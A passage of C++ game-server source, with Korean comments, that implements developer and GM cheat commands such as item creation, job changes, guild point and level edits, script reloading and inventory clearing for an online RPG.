		case LUCKY:
			m_bLucky = true;
			if( tokens.size() >= 2 ) {
				m_bLucky = ( _wtoi( tokens[1].c_str() ) == 0 ) ? false : true;
			}
			break;

		case MAKECITEM:
			{
				wstring wszString;

				if( tokens.size() < 2 ){
					wszString = FormatW(L"파라미터를 제대로 확인해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

#if defined(_VILLAGESERVER)
				return false;
#elif defined(_GAMESERVER)


				CDNGameRoom *pSession = m_pSession->GetGameRoom();
				if(!pSession) return false;
				if(!pSession->GetTaskMng()) return false;

				CDnItemTask *pTask = (CDnItemTask *)pSession->GetTaskMng()->GetTask( "ItemTask" );
				if(!pTask) return false;

				int nItemID = _wtoi(tokens[1].c_str());
				int nCount = ( tokens.size() >= 3 ) ? _wtoi(tokens[2].c_str()) : 1;
				if(nCount <= 0) nCount = 1;

				if(g_pDataManager->GetItemDropData( nItemID ) == NULL) return false;

				CMultiRoom *pRoom = pTask->GetRoom();

				for( int i=0; i<nCount; i++ ) {
					DNVector(CDnItem::DropItemStruct) VecList;
					CDnDropItem::CalcDropItemList( pRoom, nItemID, VecList );
					for( DWORD j=0; j<VecList.size(); j++ ) {
#if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
						pTask->RequestDropItem( VecList[j].dwUniqueID, *(m_pSession->GetActorHandle()->GetPosition()), VecList[j].nItemID, VecList[j].nSeed, 1, (short)( _rand(pRoom)%360 ), -1, VecList[j].nEnchantID);
#else	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
						pTask->RequestDropItem( VecList[j].dwUniqueID, *(m_pSession->GetActorHandle()->GetPosition()), VecList[j].nItemID, VecList[j].nSeed, 1, (short)( _rand(pRoom)%360 ));
#endif	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
					}
				}
#endif
			}
			break;
		case SETCP:
			{
#if defined(_GAMESERVER)
				if( tokens.size() < 2 ) return false;
				int nCP = _wtoi( tokens[1].c_str() );
				m_pSession->GetPlayerActor()->SetAccumulationCP( nCP );
#endif
			}
			break;

		case MAILREMAIN:
			{
				if(tokens.size() < 2) return false;
				int nHour = _wtoi(tokens[1].c_str());
			}
			break;

		case FULLFRIEND:
			{
				WCHAR szTempName[NAMELENMAX];
				TFriendGroup * pGroup = NULL;

				for (int i = 1; i <= 100; i++)
				{
					if(i < 10)	wsprintf(szTempName, L"쏘서리쓰0%d", i);
					else wsprintf(szTempName, L"쏘서리쓰%d", i);
					
					if(m_pSession->GetFriend()->GetFriendCount() >= FRIEND_MAXCOUNT)				break;
					if(m_pSession->GetFriend()->HasFriend(szTempName) == true)					continue;
					
				}
			}
			break;

		case FULLBLOCK:
			{
				WCHAR szTempName[NAMELENMAX];

				for (int i = 1; i <= 100; i++)
				{
					if (i < 10) wsprintf(szTempName, L"쏘서리쓰0%d", i);
					else wsprintf(szTempName, L"쏘서리쓰%d", i);

					if( m_pSession->GetIsolate()->IsIsolateItem(szTempName) == true) continue;

					TFriend * pFriend = m_pSession->GetFriend()->GetFriend(szTempName);
					if (pFriend == NULL)
					{
						m_pSession->GetDBConnection()->QueryAddIsolate(m_pSession, szTempName);
					}
				}
			}
			break;

		case RELOAD_SCRIPT:
			{
#if !defined(_FINAL_BUILD)
#if defined (_WORK) && defined (PRE_ADD_SERVER_LOAD_SHORTENING)
				g_ConfigWork.RemoveCommand(L"ExceptScript");
#endif // #if defined (_WORK) && defined (PRE_ADD_SERVER_LOAD_SHORTENING)
				g_pQuestManager->LoadAllQuest("QuestTable.ext", g_pNpcQuestScriptManager);
				g_pDataManager->LoadTalkData();
				g_pNpcQuestScriptManager->CloseAllState();
				LoadNpcQuest();

				g_pDataManager->LoadNpcData();	// 2010.11.11 Robust 추가
				g_pDataManager->LoadQuestReward(); // 2010. 11. 25 Robust 추가
#if defined(PRE_ADD_REMOTE_QUEST)
				g_pDataManager->LoadRemoteQuestData();
#endif			
				wstring wszString;
				wszString = FormatW( L"All Script Reloaded");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif	// _FINAL_BUILD
			}
			break;

			// 설명		: 몬스터 AI 스크립트를 재로드한다.
			// 작성자	: Robust
			// 작성일	: 2010.11.11
#if defined(_GAMESERVER)
		case RELOAD_MONSTER_AI:
			{
				g_AiScriptLoader.AllLoadScript();
			}
			break;
#endif // #if defined(_GAMESERVER)

		// 설명		: 던젼에 플레이중인 유저의 던젼 추적하여 난입하는 치트
		// 작성자	: 김밥
		// 작성일	: 2009.10.30
		
		case TRACE:
		{
			DN_ASSERT( m_pSession != NULL, "CDNCheatCommand::OnCommand() case TRACE: m_pSession != NULL" );
			DN_ASSERT( m_pSession->GetGMCommand() != NULL, "CDNCheatCommand::OnCommand() case TRACE: m_pSession->GetGMCommand() != NULL" );

			return m_pSession->GetGMCommand()->CmdTrace(TRACE_CHARACTERNAME, tokens );
		}

		// 설명		: 유저를 GM마을로 소환하는 기능
		// 작성자	: 김밥
		// 작성일	: 2009.11.16

		case RECALL:
		{
			DN_ASSERT( m_pSession != NULL, "CDNCheatCommand::OnCommand() case RECALL: m_pSession != NULL" );
			DN_ASSERT( m_pSession->GetGMCommand() != NULL, "CDNCheatCommand::OnCommand() case TRACE: m_pSession->GetGMCommand() != NULL" );

			return m_pSession->GetGMCommand()->CmdRecall( tokens );
		}

		// 설명		: 치트세트 실행
		// 작성자	: 김밥
		// 작성일	: 2009.12.01

		case CHEATSET:
		{
			return _bCommandCheatSet( tokens );
		}

		case SETSP:
			{
				if( tokens.size() < 2 ) 
					return false;

				unsigned short usSkillPoint = (unsigned short)_wtoi( tokens[1].c_str() );
				_ASSERT( 0 <= usSkillPoint );
				m_pSession->SetCheatSkillPoint( usSkillPoint, -1 );
			}
			break;

		case SET_USER_JOB:
		{
			if( tokens.size() < 2 )
				return false;

			DNTableFileFormat* pJobTable = GetDNTable( CDnTableDB::TJOB );

			// 현재 직업의 단계값과 루트 직업을 얻어옴.
			int iNowJob = m_pSession->GetUserJob();
			int iNowJobDeep = 0;
			int iNowRootJob = 0;
			for( int i = 0; i < pJobTable->GetItemCount(); ++i )
			{
				int iItemID = pJobTable->GetItemID( i );
				if( iItemID == iNowJob )
				{
					iNowJobDeep = pJobTable->GetFieldFromLablePtr( iItemID, "_JobNumber" )->GetInteger();
					iNowRootJob = pJobTable->GetFieldFromLablePtr( iItemID, "_BaseClass" )->GetInteger();
					break;
				}
			}

			int iJobIDToChange = _wtoi( tokens[1].c_str() );

			// 바꾸기 원하는 직업과 단계가 같거나 큰지 확인.
			bool bSuccess = false;
			map<int, int> mapRootJob;
			for( int i = 0; i < pJobTable->GetItemCount(); ++i )
			{
				int iItemID = pJobTable->GetItemID( i );
				if( iItemID == iJobIDToChange )
				{
					int iJobRootToChange = pJobTable->GetFieldFromLablePtr( iItemID, "_BaseClass" )->GetInteger();
					if( iNowRootJob == iJobRootToChange )
					{
						int iJobDeepToChange = pJobTable->GetFieldFromLablePtr( iItemID, "_JobNumber" )->GetInteger();
						if( iNowJobDeep < iJobDeepToChange )
						{
							// 부모 직업도 맞아야 함.
							int iParentJobID = pJobTable->GetFieldFromLablePtr( iItemID, "_ParentJob" )->GetInteger();
							if( iParentJobID == iNowJob )
							{
								m_pSession->SetUserJob( iJobIDToChange );
								// 한국에서는 현재 전직시 초기화를 수행하지 않음.(#19141)
								// 따라서 치트키로 전직을 했을 시 스킬 초기화를 따로 하도록 호출해준다.
#ifdef _VILLAGESERVER
								for(int nSkillPage = DualSkill::Type::Primary; nSkillPage < DualSkill::Type::MAX ; nSkillPage++ )
									m_pSession->GetSkill()->ResetSkill( nSkillPage );
#endif // #ifdef _VILLAGESERVER
								bSuccess = true;
							}
							else
							{
								// 바꾸고자 하는 직업의 부모 직업이 현재 직업이 아님.
								wstring wszString = FormatW(L"현재 직업에선 전직 할 수 없는 직업입니다.!!\r\n");
								m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());

								return false;
							}
						}
						else
						{
							// 바꾸고자하는 직업이 아래 단계임. 못바꿈.
							wstring wszString = FormatW(L"같거나 낮은 단계의 직업으로 바꿀 수 없습니다!!\r\n");
							m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());

							return false;
						}
					}
					else
					{
						// 바꾸고자하는 직업이 다른 클래스임. 못바꿈.
						wstring wszString = FormatW(L"다른 클래스의 직업으로 바꿀 수 없습니다!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());

						return false;
					}
				}
			}

			if( false == bSuccess )
			{
				wstring wszString = FormatW(L"잘못된 Job ID 입니다..\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());

				return false;
			}

			break;
		}

		// 설명		: 모든 아이템 내구도 수리( 마을에서만 사용 가능 )
		// 작성자	: 김밥
		// 작성일	: 2009.12.10

		case REPAIRALL:
		{
#if defined( _VILLAGESERVER )
			if( !m_pSession->GetItem() )
				return false;
			m_pSession->GetItem()->OnRecvRepairAll( true );
#else // #if defined( _VILLAGESERVER )
			wstring wszString = FormatW(L"마을에서만사용가능한 치트키입니다.\r\n");
			m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			break;
		}

		case BUILDUPALL:
			{
				if( tokens.size() < 2 ) return false;
				int nItemLevel = _wtoi( tokens[1].c_str() );
				if(nItemLevel <= 0) nItemLevel = 1;

#if defined( _VILLAGESERVER )
				if( !m_pSession->GetItem() ) return false;
				m_pSession->GetItem()->CheatUpgradeItemLevel(nItemLevel);
#else // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만사용가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			}
			break;

		case POTENTIALALL:
			{
				if( tokens.size() < 2 ) return false;
				int nItemPotential = _wtoi( tokens[1].c_str() );
				if(nItemPotential <= 0) nItemPotential = 1;

#if defined( _VILLAGESERVER )
				if( !m_pSession->GetItem() ) return false;
				m_pSession->GetItem()->CheatUpgradeItemPotential(nItemPotential);
#else // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만사용가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			}
			break;

		case GUILD_CREATE:			// 길드 창설
			{
				if(2 > tokens.size()) {
					return false;
				}
				const std::wstring aGuildName = tokens[1].c_str();
				if(aGuildName.empty() || GUILDNAME_MAX <= aGuildName.size()) {
					return false;
				}

#if defined(_VILLAGESERVER)

				// 20100629 길드명 작성 시 국가별 유니코드 문자대역 확인하도록 기능 추가
				if(!g_CountryUnicodeSet.Check(aGuildName.c_str())) 
				{	
					wstring wszString = FormatW(L"길드명에 사용할 수 없는 문자가 포함되었습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(GuildUID.IsSet()) {
					wstring wszString = FormatW(L"이미 길드에 가입된 상태입니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				int wGuildRoleAuth[GUILDROLE_TYPE_CNT] = { 0, };
				g_pGuildManager->SetAuthBase(wGuildRoleAuth);	// 길드 권한 적용(최초)

				m_pSession->GetDBConnection()->QueryCreateGuild(m_pSession->GetDBThreadID(), m_pSession->GetAccountDBID(), m_pSession->GetCharacterDBID(), aGuildName.c_str(), m_pSession->GetMapIndex(), m_pSession->GetLevel(), 0, g_Config.nWorldSetID, wGuildRoleAuth);

				wstring wszString = FormatW(L"길드 창설이 정상적으로 요청되었습니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#else // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			}
			break;

		case GUILD_DISMISS:			// 길드 해산
			{
				if(1 > tokens.size()) {
					return false;
				}

#if defined(_VILLAGESERVER)
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				// 이미 해체된 길드인지 체크
				if(g_pGuildManager->IsDismissExist(GuildUID)) {
					m_pSession->ResetGuildSelfView();
					m_pSession->SendDismissGuild(m_pSession->GetSessionID(), ERROR_GUILD_ALREADYDISMISS_GUILD, NULL);
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif


				if(GUILDROLE_TYPE_MASTER != m_pSession->GetGuildSelfView().btGuildRole) 
				{
					wstring wszString = FormatW(L"오직 길드장만 가능합니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				
				if(!pGuild->GetMemberInfo(m_pSession->GetCharacterDBID())) 
				{
					wstring wszString = FormatW(L"해당 길드의 길드원이 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				if(pGuild->GetMemberCount() > 1) 
				{
					wstring wszString = FormatW(L"길드원이 아직 존재합니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				m_pSession->GetDBConnection()->QueryDismissGuild( m_pSession );

				wstring wszString = FormatW(L"길드 해산이 정상적으로 요청되었습니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#else // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			}
			break;

		case GUILD_CHANGELEVEL:		// 길드 레벨 세팅
			{
				if(2 > tokens.size()) {
					return false;
				}
				short aNewGuildLevel = _wtoi(tokens[1].c_str());
				{	
					TGuildLevel* GuildNextLevel = g_pDataManager->GetGuildLevelData(aNewGuildLevel);
					if (!GuildNextLevel)
						return false;

					const TGuildUID GuildUID = m_pSession->GetGuildUID();
					if(!GuildUID.IsSet()) {
						wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
						break;
					}

					CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);

					if(!pGuild) 
					{
						wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
						break;
					}


#if !defined( PRE_ADD_NODELETEGUILD )
					CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
					if(FALSE == pGuild->IsEnable()) break;
#endif

					m_pSession->GetDBConnection()->QueryModGuildCheat(m_pSession->GetDBThreadID(), pGuild->GetUID().nWorldID, pGuild->GetUID().nDBID, 1, GuildNextLevel->nReqGuildPoint, (char)aNewGuildLevel);

				}
			}
			break;

	
		case GUILD_MAKECOIN:		// 길드 자금 증가
			{
				if(2 > tokens.size()) {
					return false;
				}
				INT64 aNewGuildMoney = _wtoi(tokens[1].c_str());
				if(!CHECK_LIMIT(aNewGuildMoney, GUILDMONEY_MAX)) {
					return false;
				}

#if defined(_VILLAGESERVER)
				// 해당 기능이 추가되지 않아 치트지원 보류(2009-12-16)
/*
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuild* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild || !pGuild->Attach(GuildUID)) {
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
				CDNGuild::TP_DETACHAUTO aDetachAuto(pGuild);

				const INT64 aCurGuildMoney = pGuild->GetInfo()->ui64GuildMoney;
				DN_ASSERT(CHECK_LIMIT(aCurGuildMoney, GUILDMONEY_MAX),	"Invalid!");

				if(aCurGuildMoney == aNewGuildMoney) {
					wstring wszString = FormatW(L"길드 현재 자금과 동일합니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				aNewGuildMoney -= aCurGuildMoney;

				g_pDBConnectionManager->QueryChangeGuildInfo(m_pSession->GetAccountDBID(), m_pSession->GetCharacterDBID(), GuildUID.nDBID, g_Config.nWorldSetID, GUILDUPDATE_TYPE_MONEY, aNewGuildMoney, 0, static_cast<INT64>(0), L"", 0);

				wstring wszString = FormatW(L"길드 자금 변경이 정상적으로 요청되었습니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
*/
#else // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
			}
			break;

		case GUILD_CHANGECMMPOINT:	// 길드 일반 포인트 증가
			{
				if(2 > tokens.size()) {
					return false;
				}
				long aNewGuildCommonPoint = _wtoi(tokens[1].c_str());
				if(!CHECK_LIMIT(aNewGuildCommonPoint, GUILDCMMPTR_MAX)) {
					return false;
				}

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				m_pSession->AddGuildPoint(GUILDPOINTTYPE_STAGE, aNewGuildCommonPoint);
			}
			break;

		case GUILD_CHANGEMISSIONPOINT:	// 길드 미션 포인트 증가
			{
				if(3 > tokens.size()) {
					return false;
				}
				long aNewPoint = _wtoi(tokens[1].c_str());
				if(!CHECK_LIMIT(aNewPoint, GUILDCMMPTR_MAX)) {
					return false;
				}

				int nMissionID = _wtoi(tokens[2].c_str());

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				m_pSession->AddGuildPoint(GUILDPOINTTYPE_MISSION, aNewPoint, nMissionID);
				return true;
			}
			break;

		case GUILD_CHANGEWARPOINT:
			{
				if(2 > tokens.size())
					return false;

				long aNewPoint = _wtoi(tokens[1].c_str());
				if(!CHECK_LIMIT(aNewPoint, GUILDCMMPTR_MAX))
					return false;

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				m_pSession->AddGuildPoint(GUILDPOINTTYPE_WAR, aNewPoint);

			}
			break;

		case ACHIEVEGUILDCOMMONMISSION:
			{
				if( tokens.size() < 2 ){
					wstring wszString = FormatW(L"길드 일반미션인덱스를넣어주세요\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) {
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드 정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
				if (pMission)
					pMission->RequestForceAchieveGuildCommonMission( _ttoi(tokens[1].c_str()) );
			}
			break;

		case GUILD_CHANGEMEMBERCOUNT:
			{
				if(2 > tokens.size()) 
					return false;

				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) 
				{
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				TAGetGuildInfo packet;
				memset(&packet, 0, sizeof(packet));
				packet.nRetCode = ERROR_NONE;

				int nCount = _wtoi(tokens[1].c_str());

				if(!pGuild->IsMemberAddable())
				{
					wstring wszString = FormatW(L"길드원을 더이상 추가할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				if(nCount > pGuild->GetInfo()->wGuildSize)
				{
					wstring wszString = FormatW(L"최대 허용 길드원수를 초과했습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				if(nCount > GUILDSIZE_MAX)
					nCount = GUILDSIZE_MAX;

				TGuildMember MemberInfo;
				TAGetGuildMember GuildMember;
				memset(&GuildMember, 0, sizeof(GuildMember));

				for (int i=0; i<nCount-1; i++)
				{
					wsprintf(MemberInfo.wszCharacterName, L"길드원_%d", i);
					MemberInfo.nCharacterDBID = i;					
					
					GuildMember.MemberList[GuildMember.nCount] = MemberInfo;
					++GuildMember.nCount;

					if( GuildMember.nCount >= SENDGUILDMEMBER_MAX )
					{
						pGuild->UpdateMember(&GuildMember);
						memset(&GuildMember, 0, sizeof(GuildMember));
					}
				}
				if(GuildMember.nCount > 0)
					pGuild->UpdateMember(&GuildMember);

				// 자신을 추가시킨다.
				MemberInfo.nAccountDBID = m_pSession->GetAccountDBID();
				MemberInfo.nCharacterDBID = m_pSession->GetCharacterDBID();
				wsprintf(MemberInfo.wszCharacterName, L"%s", m_pSession->GetCharacterName());
				pGuild->AddMember(&MemberInfo, NULL);

				// 패킷을 구성한다
				m_pSession->SendGetGuildInfo(pGuild, ERROR_NONE);
				m_pSession->SendGetGuildMember(pGuild, ERROR_NONE);
			}
			break;
			
			// 설명		: 2차 인증 정보 초기화
			// 작성자	: 김밥
			// 작성일	: 2010.01.27

		case RESET_SECONDAUTH:
			{
				break;
			}
		case FARM_START:
			{
#if defined( _VILLAGESERVER )
				CDNField* pField = m_pSession->GetField();
				if( pField )
				{
					if( pField->bIsPvPVillage() || pField->bIsPvPLobby() || pField->bIsDarkLairVillage() )
					{
						std::wstring wszString = FormatW(L"PvP마을,PvP로비,다크레어마을 에서는 해당치트를 사용할 수 없습니다.\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
						return false;
					}
				}

				CSFarmEnter packet;
				memset(&packet, 0, sizeof(CSFarmEnter));

				packet.iFarmDBID = 1;
				packet.iMapID = 15106;
				
				m_pSession->OnRecvFarmMessage( eFarm::CS_START, (char*)&packet, sizeof(packet) );
				
#else
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
				break;
			}

		case IGNOREHIT:
			{
#if defined(_GAMESERVER)
				DnActorHandle hActor = m_pSession->GetActorHandle();
				if( hActor )
					hActor->ToggleIgnoreHit();
#endif
				break;
			}

		case INVENCLEAR:
			{
				if(tokens.size() < 1) return false;
				int nInven = (tokens.size() <= 1) ? 0 : _ttoi(tokens[1].c_str());

				switch(nInven)
				{
				case 0:
					{
						m_pSession->GetItem()->CheatClearInven();

						std::wstring wszString = FormatW(L"일반 인벤토리가 초기화 되었습니다..\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					}
					break;

				case 1:
					{
						m_pSession->GetItem()->CheatClearCashInven();

						std::wstring wszString = FormatW(L"캐쉬 인벤토리가 초기화 되었습니다..\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					}
					break;

				case 2:
					{
						m_pSession->GetItem()->CheatClearQuestInven();

						std::wstring wszString = FormatW(L"퀘스트 인벤토리가 초기화 되었습니다..\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					}
					break;

				case 3:
					{
						m_pSession->GetItem()->CheatClearVehicleInven();

						std::wstring wszString = FormatW(L"탈것 인벤토리가 초기화 되었습니다..\r\n");
